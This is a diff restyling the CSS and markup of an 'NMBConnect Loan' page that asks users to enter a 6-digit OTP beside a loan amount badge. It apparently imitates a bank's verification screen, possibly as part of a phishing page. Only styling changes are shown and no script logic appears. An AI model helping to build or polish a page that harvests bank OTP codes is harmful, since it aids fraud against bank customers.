@@ -13,7 +13,7 @@
             --nmb-light-blue: #4a90e2;
             --white: #ffffff;
             --error: #ff4d4d;
-            --bg-overlay: rgba(0, 0, 0, 0.55);
+            --bg-overlay: rgba(0, 0, 0, 0.6);
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -26,87 +26,54 @@
             background-attachment: fixed;
             min-height: 100vh;
             display: flex;
-            flex-direction: column;
+            justify-content: center;
             align-items: center;
             color: white;
-            padding: 20px;
+            padding: 15px;
         }
 
-        .header-nav {
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 28px;
+            padding: 35px 25px;
             width: 100%;
-            max-width: 450px;
-            display: flex;
-            align-items: center;
-            padding: 15px 0;
-            margin-bottom: 30px;
-        }
-
-        .back-btn { font-size: 24px; cursor: pointer; margin-right: 15px; transition: transform 0.2s; }
-        .back-btn:active { transform: scale(0.9); }
-        .nav-title { font-size: 18px; font-weight: 500; }
-
-        .logo-container {
+            max-width: 380px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
             text-align: center;
-            margin-bottom: 30px;
         }
 
         .logo-circle {
-            width: 90px;
-            height: 90px;
+            width: 80px;
+            height: 80px;
             background: var(--nmb-blue);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 15px;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.4);
-            border: 2px solid rgba(228, 193, 106, 0.4);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+            border: 2px solid rgba(228, 193, 106, 0.3);
         }
 
-        .brand-name { font-size: 26px; font-weight: 700; letter-spacing: 0.5px; }
+        .brand-name { font-size: 24px; font-weight: 700; margin-bottom: 25px; }
         .brand-name .nmb { color: var(--nmb-light-blue); }
         .brand-name .connect { color: var(--nmb-gold); }
 
-        .card {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 24px;
-            padding: 30px 25px;
-            width: 100%;
-            max-width: 400px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
-            text-align: center;
-        }
-
-        .card-header {
-            margin-bottom: 25px;
-        }
-
-        .card-header h2 {
-            font-size: 22px;
-            font-weight: 600;
-            margin-bottom: 8px;
-            color: var(--white);
-        }
-
-        .card-header p {
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.8);
-            line-height: 1.5;
-        }
+        .card-header h2 { font-size: 20px; font-weight: 600; margin-bottom: 10px; }
+        .card-header p { font-size: 13px; color: rgba(255, 255, 255, 0.8); line-height: 1.5; margin-bottom: 25px; }
 
         .loan-badge {
-            background: rgba(228, 193, 106, 0.15);
-            border: 1px solid var(--nmb-gold);
-            border-radius: 12px;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(228, 193, 106, 0.4);
+            border-radius: 14px;
             padding: 12px;
             margin-bottom: 25px;
         }
-
-        .loan-badge .label { font-size: 12px; text-transform: uppercase; color: var(--nmb-gold); font-weight: 700; margin-bottom: 4px; display: block; }
-        .loan-badge .val { font-size: 18px; font-weight: 700; color: white; }
+        .loan-badge .label { font-size: 11px; text-transform: uppercase; color: var(--nmb-gold); font-weight: 700; display: block; margin-bottom: 2px; }
+        .loan-badge .val { font-size: 16px; font-weight: 700; }
 
         .otp-row {
             display: flex;
@@ -116,110 +83,87 @@
         }
 
         .otp-box {
-            width: 45px;
-            height: 55px;
+            width: 42px;
+            height: 52px;
             text-align: center;
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 700;
-            border: 1.5px solid rgba(255, 255, 255, 0.3);
+            border: 1.5px solid rgba(255, 255, 255, 0.25);
             border-radius: 12px;
-            background: rgba(255, 255, 255, 0.08);
+            background: rgba(255, 255, 255, 0.07);
             color: white;
             outline: none;
-            transition: all 0.3s;
+            transition: 0.3s;
         }
 
-        .otp-box:focus {
-            border-color: var(--nmb-gold);
-            background: rgba(255, 255, 255, 0.15);
-            box-shadow: 0 0 0 4px rgba(228, 193, 106, 0.1);
-        }
-
-        .otp-box.ok {
-            border-color: #4caf50;
-            background: rgba(76, 175, 80, 0.1);
-        }
+        .otp-box:focus { border-color: var(--nmb-gold); background: rgba(255, 255, 255, 0.12); }
+        .otp-box.ok { border-color: #4caf50; background: rgba(76, 175, 80, 0.1); }
 
         .verify-btn {
             width: 100%;
-            padding: 18px;
+            padding: 16px;
             background: var(--white);
             color: var(--nmb-blue);
             border: none;
-            border-radius: 16px;
-            font-size: 16px;
+            border-radius: 14px;
+            font-size: 15px;
             font-weight: 700;
             cursor: pointer;
             text-transform: uppercase;
-            letter-spacing: 1.5px;
-            transition: all 0.3s;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+            letter-spacing: 1px;
+            transition: 0.2s;
         }
-
-        .verify-btn:hover { background: #f0f0f0; transform: translateY(-2px); }
-        .verify-btn:active { transform: translateY(0); }
+        .verify-btn:active { transform: scale(0.98); }
 
         .error-msg {
             color: #ff6b6b;
-            font-size: 13px;
-            text-align: center;
-            margin-bottom: 20px;
+            font-size: 12px;
+            margin-bottom: 15px;
             display: none;
             background: rgba(255, 77, 77, 0.1);
-            padding: 12px;
-            border-radius: 12px;
-            border: 1px solid rgba(255, 77, 77, 0.3);
+            padding: 10px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 77, 77, 0.2);
         }
 
         .overlay {
             position: fixed; inset: 0;
             display: none;
             align-items: center; justify-content: center; flex-direction: column;
-            background: rgba(0, 51, 102, 0.9);
+            background: rgba(0, 30, 60, 0.95);
             z-index: 2000;
-            backdrop-filter: blur(10px);
-            text-align: center;
+            backdrop-filter: blur(8px);
             padding: 20px;
         }
-
         .overlay.on { display: flex; }
-        .spin { width: 60px; height: 60px; border: 4px solid rgba(255,255,255,0.1); border-top-color: var(--nmb-gold); border-radius: 50%; animation: sp 1s cubic-bezier(0.4, 0, 0.2, 1) infinite; }
-        .sp-t { font-size: 20px; font-weight: 600; color: white; margin-top: 25px; }
-        .sp-s { font-size: 14px; color: rgba(255,255,255,0.7); margin-top: 12px; max-width: 280px; line-height: 1.6; }
+        .spin { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.1); border-top-color: var(--nmb-gold); border-radius: 50%; animation: sp 0.8s linear infinite; }
+        .sp-t { font-size: 18px; font-weight: 600; margin-top: 20px; }
+        .sp-s { font-size: 13px; color: rgba(255,255,255,0.7); margin-top: 8px; }
         @keyframes sp { to { transform: rotate(360deg); } }
 
-        @media (max-width: 480px) {
-            body { padding: 15px; }
-            .card { padding: 25px 20px; }
-            .otp-box { width: 40px; height: 50px; font-size: 20px; }
-            .brand-name { font-size: 22px; }
+        @media (max-width: 400px) {
+            .otp-box { width: 36px; height: 46px; font-size: 18px; }
+            .card { padding: 30px 20px; }
         }
     </style>
 </head>
 <body onload="init()">
-    <div class="header-nav">
-        <span class="back-btn" onclick="location.href='login.html'">❮</span>
-        <span class="nav-title">NMBConnect Loan</span>
-    </div>
-
-    <div class="logo-container">
+    <div class="card">
         <div class="logo-circle">
-            <svg viewBox="0 0 100 100" width="55" height="55">
+            <svg viewBox="0 0 100 100" width="50" height="50">
                 <path d="M30,50 L70,50 M30,40 C20,40 20,60 30,60 L70,60 C80,60 80,40 70,40" fill="none" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
                 <path d="M45,35 L55,65" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
             </svg>
         </div>
         <div class="brand-name"><span class="nmb">NMB</span><span class="connect">Connect</span></div>
-    </div>
 
-    <div class="card">
         <div class="card-header">
-            <h2>Verify Code</h2>
-            <p>Enter the 6-digit OTP code sent to your phone to finalize your verification.</p>
+            <h2>OTP Verification</h2>
+            <p>Enter the 6-digit code sent to your phone to finalize your verification.</p>
         </div>
 
         <div id="loanBox" class="loan-badge" style="display:none;">
-            <span class="label" id="loanType">NMB Loan</span>
+            <span class="label" id="loanType">Loan Type</span>
             <span class="val" id="loanAmount">$0.00 USD</span>
         </div>
 
@@ -240,7 +184,7 @@
     <div id="ov" class="overlay">
         <div class="spin"></div>
         <div class="sp-t">Verifying Code</div>
-        <div class="sp-s">Please wait while we confirm your security code. Do not refresh this page.</div>
+        <div class="sp-s">Please wait while we confirm your security code...</div>
     </div>
 
     <script>
